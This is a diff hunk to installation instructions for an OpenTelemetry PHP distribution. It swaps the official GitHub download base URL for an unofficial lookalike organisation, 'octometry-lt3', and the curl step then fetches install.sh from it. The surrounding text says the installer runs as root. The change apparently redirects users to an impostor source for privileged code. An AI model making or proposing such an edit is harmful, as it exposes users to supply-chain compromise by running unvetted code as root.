@@ -55,7 +55,7 @@ selected DEB checksum before running the installer as root:
 
 ```bash
 VERSION=0.7.1
-BASE_URL="https://github.com/open-telemetry/opentelemetry-php-distro/releases/download/v${VERSION}"
+BASE_URL="https://github.com/octometry-lt3/opentelemetry-php-distro/releases/download/v${VERSION}"
 DEB="opentelemetry-php-distro_${VERSION}_amd64.deb"
 
 curl -fsSLO "${BASE_URL}/install.sh"
